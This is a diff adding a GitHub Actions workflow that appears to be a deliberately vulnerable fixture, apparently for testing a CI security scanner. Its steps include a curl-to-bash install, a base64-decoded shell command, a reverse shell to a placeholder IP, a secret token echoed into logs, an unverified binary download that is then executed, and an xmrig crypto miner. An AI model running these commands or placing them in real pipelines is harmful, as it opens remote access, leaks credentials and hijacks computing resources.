@@ -1,0 +1,40 @@
+name: Dangerous Commands Vulnerability
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  shell-attacks:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          persist-credentials: false
+
+      - name: Curl pipe to bash
+        run: curl -sSL https://example.invalid/setup.sh | bash
+
+      - name: Base64 decode to shell
+        run: echo "ZWNobyBwaXBl" | base64 -d | sh
+
+      - name: Eval dangerous variable
+        run: eval "$DYNAMIC_SCRIPT"
+
+      - name: Spawn reverse shell
+        run: bash -i >& /dev/tcp/192.0.2.1/4444 0>&1
+
+      - name: Echo secret token
+        run: echo "Deploy token is ${{ secrets.DEPLOY_KEY }}"
+
+      - name: Download without checksum and chmod
+        run: |
+          curl -sSL https://example.invalid/tool -o ./tool
+          chmod +x ./tool
+          ./tool
+
+      - name: Run crypto miner tool
+        run: ./xmrig --donate-level 1 -o pool.example.invalid:3333
